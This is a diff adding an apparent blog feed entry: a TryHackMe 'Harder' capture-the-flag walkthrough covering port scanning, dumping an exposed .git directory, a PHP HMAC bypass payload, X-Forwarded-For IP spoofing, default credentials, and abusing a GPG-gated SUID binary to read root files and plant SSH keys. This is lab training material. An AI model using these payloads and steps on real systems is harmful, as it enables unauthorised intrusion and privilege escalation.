@@ -539,6 +539,377 @@ root
         </item>
         
         <item>
+            <title>Tryhackme- Harder Writeup</title>
+            <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-harder-writeup/</link>
+            <pubDate>Thu, 10 Sep 2020 00:00:00 +0000</pubDate>
+            
+            <guid>https://0xSh1v4.github.io/posts/2020/09/tryhackme-harder-writeup/</guid>
+            <description>The following write up is for the machine: Harder
+Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</description>
+            <content type="html"><![CDATA[<p>The following write up is for the machine: Harder</p>
+<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
+<h2 id="synopsis">Synopsis</h2>
+<p><a href="https://www.tryhackme.com/room/harder">Harder</a> is the boot2root machine which reflects the real-life pentest scenario. I liked this box so much, I learned so much out of this box. It took me many hours to figure out and understand many concepts while doing this box. At somepoint, my pentesting experince helped me to crack few things. This box has lots of things ranging from sub-domain enumeration, code analysis, web bypass mechanisms and also with GPG. It was really a hard box for me to root.</p>
+<h2 id="scanning-and-enumeration-the-network">Scanning and Enumeration the network</h2>
+<p>As usual, let us run the nmap tool to can the target network.</p>
+<h3 id="nmap-results">Nmap Results:</h3>
+<p>As usual I tried to run the scan with the following command.</p>
+<pre><code>nmap -sC -sV -oA top 10.10.124.177
+</code></pre><p>But I haven&rsquo;t found any results. So, I tried using the Masscan to check all the ports.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Harder]
+└─$ sudo masscan -p1-65535 10.10.124.177 --rate=1000 -e tun0   
+Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-09-13 20:09:11 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 80/tcp on 10.10.124.177                                   
+Discovered open port 22/tcp on 10.10.124.177                                   
+Discovered open port 2/tcp on 10.10.124.177
+</code></pre><p>So, we have found 3 open ports. so, now lets try to run the nmap to find the service for these ports.</p>
+<p>We have got the following results.</p>
+<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Harder]
+└─$ nmap -sC -sV -p80,22,2 -oA top 10.10.124.177                                                                                                                                                                                          1 ⨯
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-13 22:13 CEST
+Nmap scan report for 10.10.124.177
+Host is up (0.086s latency).
+
+PORT   STATE SERVICE VERSION
+2/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f8:8c:1e:07:1d:f3:de:8a:01:f1:50:51:e4:e6:00:fe (RSA)
+|   256 e6:5d:ea:6c:83:86:20🇩🇪f0:f0:3a:1e:5f:7d:47:b5 (ECDSA)
+|_  256 e9:ef:d3:78:db:9c:47:20:7e:62:82:9d:8f:6f:45:6a (ED25519)
+22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
+80/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Error
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds
+</code></pre><p>The webpage on port 80 looks below.
+<figure>
+    <img src="/Tryhackme/Harder/1.png"
+         alt="Tryhackme: Harder machine -Index.html Page"/> <figcaption>
+            <p>Tryhackme: Harder machine -Index.html Page</p>
+        </figcaption>
+</figure>
+</p>
+<h3 id="gobuster-results">Gobuster Results:</h3>
+<p>From the scan results, we found the following phpinfo.php page
+We could see it used nginx and php-fm.
+<figure>
+    <img src="/Tryhackme/Harder/2.png"
+         alt="Tryhackme: Harder machine - info.php page"/> <figcaption>
+            <p>Tryhackme: Harder machine - info.php page</p>
+        </figcaption>
+</figure>
+</p>
+<h4 id="burp-request">Burp Request</h4>
+<pre><code>GET /download HTTP/1.1
+Host: 10.10.124.177
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+</code></pre><p>while intercepting with the Burp, we found the following response.</p>
+<h4 id="burp-response">Burp Response</h4>
+<pre><code>HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Sun, 13 Sep 2020 20:37:49 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.19
+Set-Cookie: TestCookie=just+a+test+cookie; expires=Sun, 13-Sep-2020 21:37:49 GMT; Max-Age=3600; path=/; domain=**pwd.harder.local**; secure
+Content-Length: 1985
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+</code></pre><p>From this we found the domain: <strong>pwd.harder.local</strong> in the response-cookie
+So lets add this domain in the /etc/hosts.</p>
+<p>Now, we have found the webpage login form and I have tried to bruteforce the dir using Gobuster.</p>
+<figure>
+    <img src="/Tryhackme/Harder/3.png"
+         alt="Tryhackme: Harder machine - Login Page in pwd.harder.local"/> <figcaption>
+            <p>Tryhackme: Harder machine - Login Page in pwd.harder.local</p>
+        </figcaption>
+</figure>
+
+<p>So, I have tried <em>admin/admin</em> and we got in, but there was a security check in the page.
+<figure>
+    <img src="/Tryhackme/Harder/4.png"
+         alt="Tryhackme: Harder machine - Security Check after Login Success"/> <figcaption>
+            <p>Tryhackme: Harder machine - Security Check after Login Success</p>
+        </figcaption>
+</figure>
+</p>
+<p>So, I have tried Dirb and gobuster with different wordlists.</p>
+<p>I have found a interesting .git directory via dirb and found three locations with gobuster.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Harder]
+└─$ dirb http://pwd.harder.local                                                                   
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Sep 14 00:05:24 2020
+URL_BASE: http://pwd.harder.local/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://pwd.harder.local/ ----
++ http://pwd.harder.local/.git/HEAD (CODE:200|SIZE:23)
+</code></pre><figure>
+    <img src="/Tryhackme/Harder/5.png"
+         alt="Tryhackme: Harder machine - Gobuster Results"/> <figcaption>
+            <p>Tryhackme: Harder machine - Gobuster Results</p>
+        </figcaption>
+</figure>
+
+<p>But I have tried to check these files, but it was not available in the application.</p>
+<p>there is definitely a .git directory on the server.</p>
+<p>So, I used a tool called <a href="https://github.com/arthaud/git-dumper">git-dumper</a> to download all the files. 
+For some reason, I could not able to install the tool in Kali, so I tried on my windows to fetch the files and saves it. So I can use it later in my Kali to examine the infos.</p>
+<figure>
+    <img src="/Tryhackme/Harder/6.png"
+         alt="Tryhackme: Harder machine -Git-Dumper Results"/> <figcaption>
+            <p>Tryhackme: Harder machine -Git-Dumper Results</p>
+        </figcaption>
+</figure>
+
+<h2 id="exploitation-of-the-network">Exploitation of the network</h2>
+<p>So, I have found three files from the git.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/…/PenTest/Tryhackme/Harder/Github_results]
+└─$ ls -la
+total 24
+drwxrwxrwx 1 zeus zeus  4096 Sep 14 21:47 .
+drwxrwxrwx 1 zeus zeus  4096 Sep 14 21:47 ..
+drwxrwxrwx 1 zeus zeus  4096 Sep 14 21:47 .git
+-rwxrwxrwx 1 zeus zeus    29 Sep 14 21:47 .gitignore
+-rwxrwxrwx 1 zeus zeus 23951 Sep 14 21:47 auth.php
+-rwxrwxrwx 1 zeus zeus   449 Sep 14 21:47 hmac.php
+-rwxrwxrwx 1 zeus zeus   628 Sep 14 21:47 index.php
+</code></pre><p>AFter carefully looking into the file, Inside auth.php file, there is a login function which checks for login and password where it also mentioned that the login and password should be <em>admin</em> and <em>admin</em></p>
+<figure>
+    <img src="/Tryhackme/Harder/7.png"
+         alt="Tryhackme: Harder machine - Auth.php file"/> <figcaption>
+            <p>Tryhackme: Harder machine - Auth.php file</p>
+        </figcaption>
+</figure>
+
+<p>Inside hmac.php file,</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/…/PenTest/Tryhackme/Harder/Github_results]
+└─$ cat hmac.php 
+&lt;?php
+if (empty($_GET['h']) || empty($_GET['host'])) {
+   header('HTTP/1.0 400 Bad Request');
+   print(&quot;missing get parameter&quot;);
+   die();
+}
+require(&quot;secret.php&quot;); //set $secret var
+if (isset($_GET['n'])) {
+   $secret = hash_hmac('sha256', $_GET['n'], $secret);
+}
+
+$hm = hash_hmac('sha256', $_GET['host'], $secret);
+if ($hm !== $_GET['h']){
+  header('HTTP/1.0 403 Forbidden');
+  print(&quot;extra security check failed&quot;);
+  die();
+}
+</code></pre><p>What this script does is, first it checks if the parameter <strong>h</strong> or the <strong>host</strong> parameter is being set or else it will display error.
+Second if , it checks if the parameter <strong>n</strong> is set and then it computes the hash with secret key which takes value from secret.php file. unfortunately, we don&rsquo;t have the secret.php file.
+Later, it compares the value from $hm and $secret (which has the updated hash now) and if fails, it displays the error which we saw before in the screenshot.</p>
+<p>We can&rsquo;t find the value of $_GET[&lsquo;h&rsquo;] without knowing the value in secret.php file. we need to bypass the HMAC check to get the required infos. 
+Read here: <a href="https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up">Bypass-Article</a></p>
+<p><strong>Note: It was very difficult for me to find this article, I have looked into the old writeup to find this article link and then cracked this setp alone.</strong></p>
+<p>As per this article, there is a possibilitiy to generate our hmac for messages when array is being supplied as an input.</p>
+<p>Once we supply n as array then the $secret is set to false.
+Then, in the next $hm statement, it calculates the value with the $secret as false.</p>
+<p><code>hash_hmac('sha256', &quot;securify.nl&quot;, false) = c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5</code></p>
+<p>So, we could use the below payload and get the new infos.</p>
+<p><code>/?n[]=&amp;host=securify.nl&amp;h=c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5</code></p>
+<p>Once you logged in, add this value and press enter, you will get the following creds.</p>
+<figure>
+    <img src="/Tryhackme/Harder/8.png"
+         alt="Tryhackme: Harder machine - Found credentials"/> <figcaption>
+            <p>Tryhackme: Harder machine - Found credentials</p>
+        </figcaption>
+</figure>
+
+<p>Now lets add this url  <a href="http://shell.harder.local">http://shell.harder.local</a> in the hosts file.</p>
+<p>So, I have opened the login page and used the creds which we got. It gave me the following error.</p>
+<figure>
+    <img src="/Tryhackme/Harder/9.png"
+         alt="Tryhackme: Harder machine - Visiting the shell.harder.local subdomain"/> <figcaption>
+            <p>Tryhackme: Harder machine - Visiting the shell.harder.local subdomain</p>
+        </figcaption>
+</figure>
+
+<p>So according to this error, the server request does not show any info if our ip is not in 10.10.10.x</p>
+<p>This kind of scenario, I have experienced during my pentest. So, that experience helped me to identify it immediately.</p>
+<p>we could just add <strong>X-Forwarded-For</strong> in our web request via burp with this Ip range and we could bypass this check.</p>
+<p>Read more below: <a href="https://portswigger.net/kb/issues/00400110_spoofable-client-ip-address">Burp-Spoofable-client-ip</a></p>
+<figure>
+    <img src="/Tryhackme/Harder/10.png"
+         alt="Tryhackme: Harder machine - Adding X-forwarded-for in Burp"/> <figcaption>
+            <p>Tryhackme: Harder machine - Adding X-forwarded-for in Burp</p>
+        </figcaption>
+</figure>
+
+<p>Now, It is possible to execute a shell via this page. when displying this in browser, we got the following info.
+<figure>
+    <img src="/Tryhackme/Harder/11.png"
+         alt="Tryhackme: Harder machine - Command Execution Page"/> <figcaption>
+            <p>Tryhackme: Harder machine - Command Execution Page</p>
+        </figcaption>
+</figure>
+</p>
+<p>So, now lets to add a reverse shell and get a connection back. I could not able to get the shell back. So, I tried to execute the command and got the user flag.</p>
+<figure>
+    <img src="/Tryhackme/Harder/12.png"
+         alt="Tryhackme: Harder machine -obtained User.txt by command execution"/> <figcaption>
+            <p>Tryhackme: Harder machine -obtained User.txt by command execution</p>
+        </figcaption>
+</figure>
+
+<p>Still, need to find a way to get a shell into the system. I found the machine has python3 installed and tried to pass the python3 webshell payload and got a connection success message, but it couldn&rsquo;t popup the shell.</p>
+<p>After enumerating for long time, I tried to find some interesting files.</p>
+<figure>
+    <img src="/Tryhackme/Harder/13.png"
+         alt="Tryhackme: Harder machine -Found Shell Files"/> <figcaption>
+            <p>Tryhackme: Harder machine -Found Shell Files</p>
+        </figcaption>
+</figure>
+
+<p>Found a file in /etc/ for evs-backup. (rev.sh is the shell which I transferred before to get a shell., but din&rsquo;T work out.)</p>
+<figure>
+    <img src="/Tryhackme/Harder/14.png"
+         alt="Tryhackme: Harder machine -Found the credentials from the machine"/> <figcaption>
+            <p>Tryhackme: Harder machine -Found the credentials from the machine</p>
+        </figcaption>
+</figure>
+
+<p>Now, we have obtained ssh creds for evs with the password. Lets finally get into the box via shell.</p>
+<h2 id="privilege-escaltion">Privilege Escaltion</h2>
+<p>Now we have got into the box.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Harder]
+└─$ ssh evs@10.10.93.40
+evs@10.10.93.40's password: 
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See &lt;http://wiki.alpinelinux.org/&gt;.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+harder:~$ whoami
+evs
+</code></pre><p>Then, I have tried to enumerate the system with different command and looking for SUID binaries.</p>
+<pre><code>harder:/$ find / -perm -u=s -type f 2&gt;/dev/null
+/usr/local/bin/execute-crypted
+harder:/$ /usr/local/bin/execute-crypted
+[*] Current User: root
+[-] This program runs only commands which are encypted for root@harder.local using gpg.
+[-] Create a file like this: echo -n whoami &gt; command
+[-] Encrypt the file and run the command: execute-crypted command.gpg
+</code></pre><p>Luckily, I found the an binary executable which runs only for <a href="mailto:root@harder.local">root@harder.local</a>.</p>
+<p>Then, I started to look for the keys inside the system and found the public key.</p>
+<pre><code>harder:/var/backup$ ls
+root@harder.local.pub
+</code></pre><p>Then I tried to import the keys.</p>
+<pre><code>harder:~$ gpg --import /var/backup/root@harder.local.pub
+gpg: key C91D6615944F6874: public key &quot;Administrator &lt;root@harder.local&gt;&quot; imported
+gpg: Total number processed: 1
+gpg:               imported: 1
+harder:~$ gpg --list-keys
+/home/evs/.gnupg/pubring.kbx
+----------------------------
+pub   ed25519 2020-07-07 [SC]
+      6F99621E4D64B6AFCE56E864C91D6615944F6874
+uid           [ unknown] Administrator &lt;root@harder.local&gt;
+sub   cv25519 2020-07-07 [E]
+
+harder:~$  gpg -e -r &quot;Administrator&quot; test
+gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user
+
+sub  cv25519/6C1C04522C049868 2020-07-07 Administrator &lt;root@harder.local&gt;
+ Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
+      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868
+
+It is NOT certain that the key belongs to the person named
+in the user ID.  If you *really* know what you are doing,
+you may answer the next question with yes.
+
+Use this key anyway? (y/N) y
+harder:~$ ls -la
+total 36
+drwxr-sr-x    1 evs      evs           4096 Sep 14 22:52 .
+drwxr-xr-x    1 root     root          4096 Jul  7 22:28 ..
+-rw-------    1 evs      evs           2224 Sep 14 22:58 .ash_history
+drwx--S---    4 evs      evs           4096 Sep 14 22:58 .gnupg
+-rw-r--r--    1 evs      evs             19 Sep 14 22:34 test
+-rw-r--r--    1 evs      evs            177 Sep 14 22:58 test.gpg
+-rw-r--r--    1 evs      evs            522 Sep 14 22:52 test.gpg.gpg
+-rw-r--r--    1 evs      evs             33 Jul  6 22:02 user.txt
+harder:~$ /usr/local/bin/execute-crypted test.gpg
+gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
+      &quot;Administrator &lt;root@harder.local&gt;&quot;
+3a7[REDACTED]xx6c
+</code></pre><p>Now, we got the root flag from the machine.</p>
+<p>Inside test file, I had the following code to print the contents from root.txt.</p>
+<pre><code>harder:~$ cat test
+cat /root/root.txt
+</code></pre><p>Now, lets try to get the admin shell on the machine.</p>
+<p>Tried many things, but dint workout. FInally created a ssh keys in my local machine and added it to the /root/.ssh/authorized_keys which I have created and executed the binary to make the root to add it into his authorized keys file and then I have ssh&rsquo;ed into the box to get the root shell.</p>
+<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Harder]
+└─$ ssh -i /home/zeus/.ssh/admin root@10.10.93.40
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See &lt;http://wiki.alpinelinux.org/&gt;.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+harder:~# whoami
+root
+harder:~# id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+</code></pre><p>And thats how I rooted the box. It was a long process and took me several hours, I looked the hints twice when I got struck somewhere for longtime. At the end , I learned so much.</p>
+<p>Thanks for reading! Prost! 🍺</p>
+<p>If you have any questions: Feel free to contact me.</p>
+<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
+<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
+<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
+<p><figure>
+    <img src="/HTB_profile.png"
+         alt="HTB_Profile"/> 
+</figure>
+
+<figure>
+    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
+         alt="Tryhackme"/> 
+</figure>
+</p>
+]]></content>
+        </item>
+        
+        <item>
             <title>Tryhackme- Blog Writeup</title>
             <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-blog-writeup/</link>
             <pubDate>Mon, 07 Sep 2020 00:00:00 +0000</pubDate>
